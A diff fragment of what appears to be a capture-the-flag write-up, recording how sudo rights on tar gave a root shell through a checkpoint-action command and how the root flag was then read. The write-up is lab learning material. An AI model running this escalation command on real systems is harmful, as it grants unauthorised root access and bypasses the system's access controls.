@@ -26,4 +26,5 @@ password: *******************
 #Using sudo -l found that user can run tar as sudo 
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 opens a shell as root and then found root flag under/root/root.txt
+
 #Found flag2:`THM{******_******}`
